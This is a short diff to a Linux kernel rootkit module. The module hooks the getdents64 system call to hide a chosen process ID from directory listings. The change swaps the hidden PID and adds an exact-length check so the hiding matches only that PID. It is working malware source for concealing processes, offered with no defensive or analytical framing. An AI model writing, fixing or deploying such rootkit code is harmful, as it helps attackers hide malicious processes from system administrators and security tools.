@@ -11,7 +11,7 @@
 
 MODULE_LICENSE("GPL");
 
-#define PID_TO_HIDE "2650"
+#define PID_TO_HIDE "2201"
 #define DEBUG
 
 struct linux_dirent {
@@ -73,7 +73,7 @@ asmlinkage int hooked_getdents64(const struct pt_regs * pt_regs)
         printk(KERN_INFO "[DEBUG] rootkit dir name: %s\n", (char*)dir->d_name);
         #endif
 
-        if (((memcmp(PID_TO_HIDE, (char*) dir->d_name, strlen(PID_TO_HIDE))) == 0))
+        if ((strlen((char*) dir->d_name) == strlen(PID_TO_HIDE)) && ((memcmp(PID_TO_HIDE, (char*) dir->d_name, strlen(PID_TO_HIDE))) == 0))
         {
             printk(KERN_INFO "[DEBUG] rootkit found the correct file name!\n");
             if (dir == kdirent)
